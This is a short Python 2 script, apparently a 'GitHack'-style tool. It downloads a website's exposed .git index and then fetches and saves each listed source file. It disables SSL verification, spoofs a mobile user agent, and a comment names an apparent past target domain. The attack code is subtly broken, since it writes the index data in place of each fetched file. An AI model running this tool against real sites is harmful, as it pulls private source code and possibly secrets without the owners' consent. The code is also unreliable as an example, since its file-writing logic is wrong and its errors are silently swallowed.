#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys
import urllib2
import os
import urlparse
import threading
import Queue
from lib.parser import parse
import ssl



context = ssl._create_unverified_context()

class Scanner(object):
    def __init__(self):
        self.base_url = sys.argv[-1]
        self.domain = urlparse.urlparse(self.base_url)

        if not os.path.exists(self.domain.netloc):
            os.makedirs(self.domain.netloc)
        #os.mkdir('static.myysq.com.cn')
        print '[+] Download and parse index file ...'
        data = self._request_data(self.base_url + '/.git/index')
        with open('index', 'wb') as f:
            f.write(data)
        self.queue = Queue.Queue()
        for entry in parse('index'):
            if "sha1" in entry.keys():
                self.queue.put((entry["name"].strip()))
                try:
                    URL = (self.base_url+'./'+entry['name'])
                    print URL
                    self._request_data(URL)
                    domain = urlparse.urlparse(URL)
                    file_name = domain.path.replace('/./','')
                    target_dir = os.path.join(domain.netloc, os.path.dirname(file_name))
                    print(target_dir)
                    if target_dir and not os.path.exists(target_dir):
                        os.makedirs(target_dir)
                    with open(os.path.join(domain.netloc, file_name), 'wb') as f:
                        f.write(data)

                except Exception as e:
                    pass
        self.lock = threading.Lock()
        self.thread_count = 20
        self.STOP_ME = False

    @staticmethod
    def _request_data(url):
        
        request = urllib2.Request(url, None, {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
        #request.set_proxy('127.0.0.1:8080','http')
        return urllib2.urlopen(request,context=context).read()

def banner():
    print('*********************************************************')
    print('**       * * * *           **        * * * * *         **')
    print('**      *       *                        *             **')
    print('**     *                   **            *             **')
    print('**     *    * * *          **            *             **')
    print('**      *       *          **            *             **')
    print('**        *  *  *          **            *             **')
    print('*********************************************************')

if __name__ == '__main__':
    try:
        banner()
        s = Scanner()
    except:
        #banner()
        print('eg: pyhton Githack1.py http://xxx.xom')






